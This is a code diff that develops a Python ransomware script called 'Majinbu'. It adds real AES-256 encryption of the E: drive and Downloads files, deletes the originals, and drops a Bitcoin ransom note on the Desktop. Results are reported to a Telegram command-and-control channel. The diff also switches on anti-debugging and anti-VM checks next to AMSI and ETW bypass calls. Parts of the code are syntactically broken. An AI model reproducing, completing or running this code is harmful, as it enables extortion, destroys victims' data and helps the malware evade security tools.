@@ -1,3 +1,4 @@
+#v4
 import os
 import sys
 import time
@@ -16,6 +17,12 @@ import base64
 from ctypes import wintypes, windll, byref, c_void_p, c_ulong
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization
+
 
 # Telegram C2
 
@@ -189,6 +196,82 @@ def majinbu_encryption(key):
         adversarial_timing()
     return count
 
+def targeted_encryption_real():
+    """AES-256 REAL ENCRYPTION - New Volume E + Downloads ONLY"""
+    print("\\033[33m[*] REAL AES-256 ENCRYPTION: E:\\ + Downloads\\033[0m")
+    
+    # TARGETS: New Volume E + Downloads
+    targets = [
+        r"E:\",  # New Volume E (Partisi Windows)
+        os.path.join(os.path.expanduser("~"), "Downloads")  # Downloads
+    ]
+    
+    # GLOBAL MASTER KEY (simpan untuk decrypt nanti)
+    master_key = os.urandom(32)  # 256-bit AES key
+    salt = os.urandom(16)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=100000,
+    )
+    encryption_key = kdf.derive(master_key)
+    
+    # RSA Keypair untuk attacker
+    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    public_key = private_key.public_key()
+    
+    encrypted_count = 0
+    
+    for target_path in targets:
+        if not os.path.exists(target_path):
+            print(f"[-] Skip: {target_path}")
+            continue
+            
+        print(f"[+] Scanning: {target_path}")
+        for root, dirs, dirs[:] = [], files in os.walk(target_path):
+            for file in files:
+                if file.endswith(('.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp4')):
+                    file_path = os.path.join(root, file)
+                    encrypted_path = file_path + ".majinbu"
+                    
+                    try:
+                        # BACA FILE
+                        with open(file_path, 'rb') as f:
+                            data = f.read()
+                        
+                        # GENERATE FILE-SPECIFIC IV + SALT
+                        iv = os.urandom(16)
+                        file_salt = os.urandom(16)
+                        
+                        # AES-256-CBC ENCRYPT
+                        cipher = Cipher(algorithms.AES(encryption_key), modes.CBC(iv), backend=default_backend())
+                        encryptor = cipher.encryptor()
+                        padded_data = data + b"\x00" * (16 - len(data) % 16)  # PKCS7 padding
+                        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+                        
+                        # SIMPAN: [SALT][IV][ENCRYPTED_DATA]
+                        with open(encrypted_path, 'wb') as f:
+                            f.write(file_salt + iv + encrypted_data)
+                        
+                        # HAPUS ASLI
+                        os.remove(file_path)
+                        
+                        print(f"    ✅ {os.path.basename(file)} → {encrypted_count+1}")
+                        encrypted_count += 1
+                        
+                    except Exception as e:
+                        print(f"    ❌ {file}: {e}")
+                        continue
+    
+    # SIMPAN KEYS UNTUK DECRYPT (research only)
+    with open("keys_majinbu.json", "wb") as f:
+        f.write(base64.b64encode(salt + master_key))
+    
+    print(f"\\033[32m🎉 ENCRYPTED: {encrypted_count} files | Keys: keys_majinbu.json\\033[0m")
+    return encrypted_count
+
+
 def encrypt_file(key, path): return True
 
 def send_telegram(msg):
@@ -197,13 +280,24 @@ def send_telegram(msg):
                      data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'HTML'}, timeout=10)
     except: pass
 
-def create_ransom_notes():
+def create_notes():
+
     content = """⚠️ FILES ENCRYPTED - BACKUPS DESTROYED ⚠️
 
 No System Restore, no Windows Backup, no recovery.
 
 0.5 BTC → 1A1zP1eP5QGefi2DMPTfTL5SLmv7Qi1eLP"""
-    open("C:\\note_readme.txt", "w").write(content)
+    
+    # DESKTOP PATH - SELALU AMAN
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "note_readme.txt")
+    
+    try:
+        with open(desktop_path, "w", encoding='utf-8') as f:
+            f.write(content)
+        print(f"[+] Ransom note created: {desktop_path}")
+    except Exception as e:
+        print(f"[-] Note error: {e}")
+
 
 # ═══════════════════ MAIN APT EXECUTION ═══════════════════
 def main():
@@ -220,7 +314,7 @@ def main():
     stats = {
         "network": network_propagate(),
         "usb_cloud": removable_cloud_propagate(),
-        "encrypted": majinbu_encryption(key)
+        "encrypted": targeted_encryption_real()
     }
 
     report = f"""🎯 MAJINBU APT + ANTI-DEBUG SUCCESS
@@ -234,7 +328,7 @@ def main():
 📊 STATS: {stats}"""
 
     send_telegram(report)
-    create_ransom_notes()
+    create_notes()
 
     print(f"\033[32m🎉 APT DEPLOYMENT COMPLETE\033[0m")
     subprocess.Popen(f'timeout /t 3 >nul & del "{sys.argv[0]}"', shell=True)
@@ -245,12 +339,12 @@ if __name__ == "__main__":
     # EXECUTION CHAIN (CRITICAL ORDER)
     etw_ghost_bypass()          # EDR blind
     amsi_bypass()              # Script scanner OFF
-    #if not anti_debug_suite():  # DEBUGGER CHECK ← NEW! #aktifkan jika tidak sedang pengujian
+    if not anti_debug_suite():  # DEBUGGER CHECK ← NEW!
         # sys.exit(0) #aktifkan jika tidak sedang pengujian
     polymorphic_init()         # AI evasion
     time.sleep(random.randint(15, 45))
 
-    #if anti_vm_complete():#aktifkan jika tidak sedang pengujian
+    if anti_vm_complete():
        # sys.exit(0) #aktifkan jika tidak sedang pengujian
 
     main()
